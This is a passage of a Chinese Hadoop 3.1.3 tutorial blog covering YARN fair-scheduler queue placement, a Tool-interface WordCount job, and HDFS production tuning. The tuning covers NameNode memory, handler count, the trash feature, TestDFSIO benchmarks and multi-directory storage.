class="name">queuePlacementPolicy</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提交任务时指定队列,如未指定提交队列,则继续匹配下一个规则; false表示：如果指定队列不存在,不允许自动创建--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">"specified"</span> <span class="attr">create</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提交到root.group.username队列,若root.group不存在,不允许自动创建；若root.group.user不存在,允许自动创建 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">"nestedUserQueue"</span> <span class="attr">create</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">"primaryGroup"</span> <span class="attr">create</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 最后一个规则必须为reject或者default。Reject表示拒绝创建提交失败，default表示把任务提交到default队列 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">"reject"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queuePlacementPolicy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">allocations</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分发并测试提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xsync yarn-site.xml</span><br><span class="line">xsync fair-scheduler.xml</span><br><span class="line">sbin/stop-yarn.sh</span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交任务时指定队列，按照配置规则，任务会到指定的root.test队列</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar pi -Dmapreduce.job.queuename=root.test 1 1</span><br><span class="line"><span class="comment"># 提交任务时不指定队列，按照配置规则，任务会到root.atguigu.atguigu队列</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar pi 1 1</span><br></pre></td></tr></table></figure><h3 id="2-4-Yarn的Tool接口案例">2.4 Yarn的Tool接口案例</h3><p>自己写的jar包期望可以动态传参，结果报错，误认为是第一个输入参数，解决方法编写 Yarn 的 Tool 接口，首先编写maven项目，导包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建类WordCount并实现Tool接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> <span class="keyword">implements</span> <span class="title">Tool</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Configuration conf;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">run</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Job job = Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        job.setJarByClass(WordCountDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        job.setMapperClass(WordCountMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setReducerClass(WordCountReducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        job.setMapOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapOutputValueClass(IntWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputValueClass(IntWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(args[<span class="number">0</span>]));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(args[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> job.waitForCompletion(<span class="keyword">true</span>) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setConf</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.conf = conf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Configuration <span class="title">getConf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> conf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Text outK = <span class="keyword">new</span> Text();</span><br><span class="line">        <span class="keyword">private</span> IntWritable outV = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            String line = value.toString();</span><br><span class="line">            String[] words = line.split(<span class="string">" "</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">                outK.set(word);</span><br><span class="line">                context.write(outK, outV);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IntWritable outV = <span class="keyword">new</span> IntWritable();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">                sum += value.get();</span><br><span class="line">            &#125;</span><br><span class="line">            outV.set(sum);</span><br><span class="line">            context.write(key, outV);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//新建WordCountDriver</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountDriver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Tool tool;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 创建配置文件</span></span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 判断是否有tool接口</span></span><br><span class="line">        <span class="keyword">switch</span> (args[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"wordcount"</span>:</span><br><span class="line">                tool = <span class="keyword">new</span> WordCount();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">" No such tool: "</span>+ args[<span class="number">0</span>] );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 用Tool执行程序</span></span><br><span class="line">        <span class="comment">// 用这个方法可以过滤-D</span></span><br><span class="line">        <span class="comment">// Arrays.copyOfRange 将老数组的元素放到新数组里面</span></span><br><span class="line">        <span class="keyword">int</span> run = ToolRunner.run(conf, tool, Arrays.copyOfRange(args, <span class="number">1</span>, args.length));</span><br><span class="line"></span><br><span class="line">        System.exit(run);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在HDFS上准备输入文件，假设为/input目录，向集群提交该Jar包<code>yarn jar YarnDemo.jar com.atguigu.yarn.WordCountDriver wordcount /input /output</code>注意此时提交的3个参数，第一个用于生成特定的Tool，第二个和第三个为输入输出目录。此时如果我们希望加入设置参数，可以在wordcount后面添加参数，例如：<code>yarn jar YarnDemo.jar com.atguigu.yarn.WordCountDriver wordcount -Dmapreduce.job.queuename=root.test /input /output1</code></p><h1>五、Hadoop生产调优</h1><h2 id="1、HDFS核心参数">1、HDFS核心参数</h2><h3 id="1-1-NameNode内存生产配置">1.1 NameNode内存生产配置</h3><p>NameNode内存计算，每个文件块大概占用150byte，一台服务器128G内存为例，能存储多少文件块呢？128 * 1024 * 1024 * 1024  / 150Byte ≈ 9.1亿</p><p>Hadoop2.x系列，配置NameNode内存，<strong>NameNode内存默认2000m</strong>，如果服务器内存4G，NameNode内存可以配置3g。在hadoop-env.sh文件中配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HADOOP_NAMENODE_OPTS=-Xmx3072m</span><br></pre></td></tr></table></figure><p>Hadoop3.x系列，配置NameNode内存，<strong>hadoop-env.sh中描述Hadoop的内存是动态分配的</strong>(<strong><a href="http://hadoop-env.sh" target="_blank" rel="noopener">hadoop-env.sh</a></strong>在etc/hadoop目录下)，比如我4g内存分配了948MB堆内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看NameNode和DataNode占用内存</span></span><br><span class="line">jps</span><br><span class="line">jmap -heap 2611</span><br><span class="line"><span class="comment"># 查看发现hadoop102上的NameNode和DataNode占用内存都是自动分配的，且相等。不是很合理</span></span><br><span class="line"><span class="comment"># 经验参考:https://docs.cloudera.com/documentation/enterprise/6/release-notes/topics/rg_hardware_requirements.html#concept_fzz_dq4_gbb</span></span><br><span class="line"><span class="comment"># 经验推荐</span></span><br><span class="line"><span class="comment"># namenode最小值1G，每增加1000000个block，增加1G内存</span></span><br><span class="line"><span class="comment"># datanode最小值4G，block数,或者副本数升高，都应该调大datanode的值。一个datanode上的副本总数低于4000000,调为4G，超过4000000,每增加1000000，增加1G</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体修改：hadoop-env.sh</span></span><br><span class="line"><span class="built_in">export</span> HDFS_NAMENODE_OPTS=<span class="string">"-Dhadoop.security.logger=INFO,RFAS -Xmx1024m"</span></span><br><span class="line"><span class="built_in">export</span> HDFS_DATANODE_OPTS=<span class="string">"-Dhadoop.security.logger=ERROR,RFAS -Xmx1024m"</span></span><br></pre></td></tr></table></figure><h3 id="1-2-NameNode心跳并发配置">1.2 NameNode心跳并发配置</h3><p>每个节点启动时，都会发送心跳包给NN那么NameNode准备多少线程合适?<code>vim hdfs-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The number of Namenode RPC server threads that listen to requests from clients. If dfs.namenode.servicerpc-address is not configured then Namenode RPC server threads listen to requests from all nodes.</span><br><span class="line">NameNode有一个工作线程池，用来处理不同DataNode的并发心跳以及客户端并发的元数据操作。</span><br><span class="line">对于大集群或者有大量客户端的集群来说，通常需要增大该参数。默认值是10。</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.handler.count<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>21<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>企业经验：dfs.namenode.handler.count=(20乘以以e为底log的ClusterSize)，比如集群规模（DataNode台数）为3台时，此参数设置为21。可通过简单的python代码计算该值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> int(<span class="number">20</span>*math.log(<span class="number">3</span>))</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>quit()</span><br></pre></td></tr></table></figure><h3 id="1-3-开启回收站配置">1.3 开启回收站配置</h3><blockquote><p>开启回收站功能，可以将删除的文件在不超时的情况下，恢复原数据，起到防止误删除、备份等作用</p></blockquote><p>参数说明：</p><ul><li>默认值fs.trash.interval = 0，0表示禁用回收站；其他值表示设置文件的存活时间</li><li>默认值fs.trash.checkpoint.interval = 0，检查回收站的间隔时间。如果该值为0，则该值设置和fs.trash.interval的参数值相等</li><li>要求fs.trash.checkpoint.interval &lt;= fs.trash.interval</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line"><span class="comment"># 修改core-site.xml，配置垃圾回收时间为1分钟</span></span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;fs.trash.interval&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"><span class="comment"># 修改完后进行分发，然后重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回收站目录在HDFS集群中的路径：/user/atguigu/.Trash/…</span></span><br><span class="line"><span class="comment"># 注意：通过网页上直接删除的文件也不会走回收站</span></span><br><span class="line"><span class="comment"># 通过程序删除的文件不会经过回收站，需要调用moveToTrash()才进入回收站</span></span><br><span class="line">Trash trash = New Trash(conf);</span><br><span class="line">trash.moveToTrash(path);</span><br><span class="line"><span class="comment"># 只有在命令行利用hadoop fs -rm命令删除的文件才会走回收站，需要在NN所在客户端执行</span></span><br><span class="line">hadoop fs -rm -r /user/atguigu/input</span><br><span class="line"><span class="comment"># 恢复回收站数据</span></span><br><span class="line">hadoop fs -mv</span><br><span class="line">/user/atguigu/.Trash/Current/user/atguigu/input    /user/atguigu/input</span><br></pre></td></tr></table></figure><h2 id="2、HDFS集群压测">2、HDFS集群压测</h2><p>HDFS的读写性能主要受<strong>网络和磁盘</strong>影响比较大。为了方便测试，将hadoop102、hadoop103、hadoop104虚拟机网络都设置为100mbps。测试网速：来到hadoop102的<code>/opt/module</code>目录，创建一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><h3 id="2-1-测试HDFS写性能">2.1 测试HDFS写性能</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330938.png" alt></p><p>测试内容：向HDFS集群写10个128M的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意：nrFiles n为生成mapTask的数量，生产环境一般可通过hadoop103:8088查看CPU核数，设置为（CPU核数 - 1）</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -write -nrFiles 10 -fileSize 128MB</span><br><span class="line"><span class="comment"># 测试结果</span></span><br><span class="line">2021-02-09 10:43:16,853 INFO fs.TestDFSIO: ----- TestDFSIO ----- : write</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:             Date &amp; time: Tue Feb 09 10:43:16 CST 2021</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:         Number of files: 10</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:  Total MBytes processed: 1280</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:       Throughput mb/sec: 1.61</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:  Average IO rate mb/sec: 1.9</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:   IO rate std deviation: 0.76</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:      Test <span class="built_in">exec</span> time sec: 133.05</span><br><span class="line">2021-02-09 10:43:16,854 INFO fs.TestDFSIO:</span><br></pre></td></tr></table></figure><ul><li>Number of files：生成mapTask数量，一般是集群中（CPU核数-1），我们测试虚拟机就按照实际的物理内存-1分配即可</li><li>Total MBytes processed：单个map处理的文件大小</li><li>Throughput mb/sec：单个mapTak的吞吐量 。计算方式：处理的总文件大小/每一个mapTask写数据的时间累加；集群整体吞吐量：生成mapTask数量*单个mapTak的吞吐量</li><li>Average IO rate mb/sec：平均mapTak的吞吐量。计算方式：每个mapTask处理文件大小/每一个mapTask写数据的时间，全部相加除以task数量</li><li>IO rate std deviation：方差、反映各个mapTask处理的差值，越小越均衡</li></ul><p>注意：如果测试过程中，出现异常，说明检查了虚拟内存，可以在yarn-site.xml中设置虚拟内存检测为false，分发配置并重启Yarn集群<code>sbin/stop-yarn.sh</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--是否启动一个线程检查每个任务正使用的虚拟内存量，如果任务超出分配值，则直接将其杀掉，默认是true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试结果分析，由于副本1就在本地，所以该副本不参与测试，一共参与测试的文件：10个文件 * 2个副本 = 20个，压测后的速度：1.61，实测速度：1.61M/s * 20个文件 ≈ 32M/s，三台服务器的带宽：12.5 + 12.5 + 12.5 ≈ 30m/s，所有网络资源都已经用满。<strong>如果实测速度远远小于网络，并且实测速度不能满足工作需求，可以考虑采用固态硬盘或者增加磁盘个数</strong></p><p>如果客户端不在集群节点，那就三个副本都参与计算</p><h3 id="2-2-测试HDFS读性能">2.2 测试HDFS读性能</h3><p>测试内容：读取HDFS集群10个128M的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -<span class="built_in">read</span> -nrFiles 10 -fileSize 128MB</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">2021-02-09 11:34:15,847 INFO fs.TestDFSIO: ----- TestDFSIO ----- : <span class="built_in">read</span></span><br><span class="line">2021-02-09 11:34:15,847 INFO fs.TestDFSIO:             Date &amp; time: Tue Feb 09 11:34:15 CST 2021</span><br><span class="line">2021-02-09 11:34:15,847 INFO fs.TestDFSIO:         Number of files: 10</span><br><span class="line">2021-02-09 11:34:15,847 INFO fs.TestDFSIO:  Total MBytes processed: 1280</span><br><span class="line">2021-02-09 11:34:15,848 INFO fs.TestDFSIO:       Throughput mb/sec: 200.28</span><br><span class="line">2021-02-09 11:34:15,848 INFO fs.TestDFSIO:  Average IO rate mb/sec: 266.74</span><br><span class="line">2021-02-09 11:34:15,848 INFO fs.TestDFSIO:   IO rate std deviation: 143.12</span><br><span class="line">2021-02-09 11:34:15,848 INFO fs.TestDFSIO:      Test <span class="built_in">exec</span> time sec: 20.83</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试结果分析：为什么读取文件速度大于网络带宽？由于目前只有三台服务器，且有三个副本，数据读取就近原则，相当于都是读取的本地磁盘数据，没有走网络</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除测试生成数据</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -clean</span><br></pre></td></tr></table></figure><h2 id="3、HDFS多目录">3、HDFS多目录</h2><h3 id="3-1-NameNode多目录配置">3.1  NameNode多目录配置</h3><blockquote><p>NameNode的本地目录可以配置成多个，且每个目录存放内容相同，增加了可靠性(非高可用)</p></blockquote><p>在hdfs-site.xml文件中添加如下内容，注意：因为每台服务器节点的磁盘情况不同，所以这个配置配完之后，可以选择不分发</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>file://$&#123;hadoop.tmp.dir&#125;/dfs/name1,file://$&#123;hadoop.tmp.dir&#125;/dfs/name2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>停止集群，删除三台节点的data和logs中所有数据，格式化集群并启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 三台都要删除</span></span><br><span class="line">rm -rf data/ logs/</span><br><span class="line"></span><br><span class="line">bin/hdfs namenode -format</span><br><span class="line">sbin/start-dfs.sh</span><br><span class="line"><span class="comment"># 检查name1和name2里面的内容，发现一模一样</span></span><br></pre></td></tr></table></figure><h3 id="3-2-DataNode多目录配置-重要">3.2 DataNode多目录配置(重要)</h3><blockquote><p>DataNode可以配置成多个目录，<strong>每个目录存储的数据不一样</strong>（数据不是副本）</p></blockquote><p>在hdfs-site.xml文件中添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>file://$&#123;hadoop.tmp.dir&#125;/dfs/data1,file://$&#123;hadoop.tmp.dir&#125;/dfs/data2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重启集群，查看结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /opt/module/hadoop-3.1.3/data/dfs</span></span><br><span class="line"><span class="comment"># 向集群上传一个文件，再次观察两个文件夹里面的内容发现不一致（一个有数一个没有）</span></span><br></pre></td></tr></table></figure><h3 id="3-3-集群数据均衡之磁盘间数据均衡">3.3 集群数据均衡之磁盘间数据均衡</h3><p>生产环境，由于硬盘空间不足，往往需要增加一块硬盘。刚加载的硬盘没有数据时，可以执行磁盘数据均衡命令。（Hadoop3.x新特性）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 